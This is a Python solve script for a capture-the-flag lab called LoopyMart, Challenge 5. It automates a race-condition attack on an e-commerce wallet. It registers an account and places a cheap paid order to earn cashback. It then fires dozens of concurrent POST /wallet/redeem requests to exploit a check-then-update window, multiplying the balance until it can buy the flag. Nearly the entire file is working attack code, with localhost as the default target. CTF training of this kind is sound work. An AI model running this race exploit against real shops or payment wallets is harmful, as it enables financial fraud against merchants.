#!/usr/bin/env python3
"""
LoopyMart CTF — Challenge 5: Race Condition Cashback
Exploit: fire many concurrent POST /wallet/redeem requests to trigger the TOCTOU window
and multiply pending_cashback far beyond the ₹333 flag price.

Usage:
    python solutions/wallet-race-condition/solve.py
    python solutions/wallet-race-condition/solve.py --url http://localhost:8001 \
        --email hacker@pwn.com --password secret --redeem-requests 40
"""

import argparse
import asyncio
import sys
import uuid

try:
    import httpx
except ImportError:
    sys.exit("[!] httpx required: pip install httpx")


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

async def register(client: httpx.AsyncClient, base_url: str, email: str, password: str) -> None:
    """Register a fresh account (ignore 400 if already exists)."""
    r = await client.post(
        f"{base_url}/auth/register",
        json={"email": email, "password": password, "full_name": "Racer"},
    )
    if r.status_code not in (200, 201, 400):
        r.raise_for_status()


async def login(client: httpx.AsyncClient, base_url: str, email: str, password: str) -> str:
    """Return a JWT access token."""
    r = await client.post(
        f"{base_url}/auth/login",
        json={"email": email, "password": password},
    )
    r.raise_for_status()
    token = r.json().get("access_token")
    if not token:
        sys.exit(f"[!] Login failed: {r.text}")
    return token


async def place_cheap_order(client: httpx.AsyncClient, base_url: str, token: str) -> str | None:
    """
    Attempt to buy the cheapest available product to trigger cashback.
    Returns the order_id on success, None on failure.
    """
    headers = {"Authorization": f"Bearer {token}"}

    # Grab some products
    r = await client.get(f"{base_url}/products", headers=headers, params={"limit": 10})
    if r.status_code != 200:
        return None
    products = r.json()
    if not products:
        return None

    cheapest = min(products, key=lambda p: p.get("price", 9999))
    product_id = cheapest["id"]

    # Add to cart
    r = await client.post(
        f"{base_url}/cart",
        headers=headers,
        json={"product_id": product_id, "quantity": 1},
    )
    if r.status_code not in (200, 201):
        return None

    # Place order with a dummy address
    address_id = None
    ar = await client.post(
        f"{base_url}/addresses",
        headers=headers,
        json={
            "full_name": "Racer",
            "phone": "9999999999",
            "address_line1": "1 Race Street",
            "city": "Mumbai",
            "state": "Maharashtra",
            "pincode": "400001",
            "is_default": True,
        },
    )
    if ar.status_code in (200, 201):
        address_id = ar.json().get("id")

    if not address_id:
        return None

    or_ = await client.post(
        f"{base_url}/orders",
        headers=headers,
        json={"address_id": address_id},
    )
    if or_.status_code not in (200, 201):
        return None

    order_id = or_.json().get("id") or or_.json().get("order_id")
    if not order_id:
        return None

    # Pay (dummy)
    pr = await client.post(
        f"{base_url}/payments/pay",
        headers=headers,
        json={
            "order_id": order_id,
            "payment_method": "upi",
        },
    )
    if pr.status_code != 200:
        return None

    return order_id


async def get_wallet(client: httpx.AsyncClient, base_url: str, token: str) -> dict:
    r = await client.get(f"{base_url}/wallet", headers={"Authorization": f"Bearer {token}"})
    r.raise_for_status()
    return r.json()


async def redeem_once(client: httpx.AsyncClient, base_url: str, token: str) -> dict:
    r = await client.post(
        f"{base_url}/wallet/redeem",
        headers={"Authorization": f"Bearer {token}"},
    )
    return r.json() if r.status_code == 200 else {"error": r.text}


async def purchase_flag(client: httpx.AsyncClient, base_url: str, token: str) -> dict:
    r = await client.post(
        f"{base_url}/wallet/purchase-flag",
        headers={"Authorization": f"Bearer {token}"},
        json={"item_id": "ctf_flag"},
    )
    r.raise_for_status()
    return r.json()


# ---------------------------------------------------------------------------
# Main exploit
# ---------------------------------------------------------------------------

async def exploit(base_url: str, email: str, password: str, n_redeem: int) -> None:
    async with httpx.AsyncClient(timeout=30) as client:
        # Step 1 – Get an account with pending cashback
        print(f"[*] Registering / logging in as {email} …")
        await register(client, base_url, email, password)
        token = await login(client, base_url, email, password)
        print("[+] Authenticated")

        wallet = await get_wallet(client, base_url, token)
        print(
            f"[*] Wallet before exploit: balance=₹{wallet['balance']:.2f}  "
            f"pending=₹{wallet['pending_cashback']:.2f}"
        )

        # Step 2 – Earn cashback if needed (place a paid order)
        if wallet["pending_cashback"] <= 0:
            print("[*] No pending cashback — placing a paid order to earn some …")
            order_id = await place_cheap_order(client, base_url, token)
            if order_id:
                print(f"[+] Order {order_id} paid")
                wallet = await get_wallet(client, base_url, token)
                print(f"[*] Pending cashback after order: ₹{wallet['pending_cashback']:.2f}")
            else:
                print(
                    "[!] Could not place a real order automatically.\n"
                    "    Place one manually via the UI, then re-run this script."
                )
                return

        if wallet["pending_cashback"] <= 0:
            print("[!] Still no pending cashback. Aborting.")
            return

        # Step 3 – Fire N concurrent redeem requests to exploit the TOCTOU window
        print(f"[*] Launching {n_redeem} concurrent POST /wallet/redeem requests …")
        tasks = [redeem_once(client, base_url, token) for _ in range(n_redeem)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        successes = sum(1 for r in results if isinstance(r, dict) and "amount_redeemed" in r)
        print(f"[+] {successes}/{n_redeem} redeems returned success")

        wallet = await get_wallet(client, base_url, token)
        print(
            f"[*] Wallet after race: balance=₹{wallet['balance']:.2f}  "
            f"pending=₹{wallet['pending_cashback']:.2f}"
        )

        if wallet["balance"] < 333:
            print(
                f"[!] Balance ₹{wallet['balance']:.2f} is still below ₹333.\n"
                f"    Try increasing --redeem-requests (currently {n_redeem}) or run again."
            )
            return

        # Step 4 – Buy the flag
        print("[*] Purchasing the CTF flag …")
        resp = await purchase_flag(client, base_url, token)
        if resp.get("success"):
            print(f"\n[+] Flag: {resp['flag']}\n")
        else:
            print(f"[!] Purchase failed: {resp}")


def main() -> None:
    parser = argparse.ArgumentParser(description="LoopyMart wallet race condition exploit")
    parser.add_argument("--url", default="http://localhost:8001", help="Base API URL")
    parser.add_argument(
        "--email",
        default=f"racer_{uuid.uuid4().hex[:8]}@pwn.com",
        help="Account email (auto-generated if omitted)",
    )
    parser.add_argument("--password", default="Password123!", help="Account password")
    parser.add_argument(
        "--redeem-requests",
        type=int,
        default=30,
        help="Number of concurrent /wallet/redeem requests (default: 30)",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("  LoopyMart CTF — Challenge 5: Race Condition Cashback")
    print("=" * 60)
    asyncio.run(exploit(args.url, args.email, args.password, args.redeem_requests))


if __name__ == "__main__":
    main()
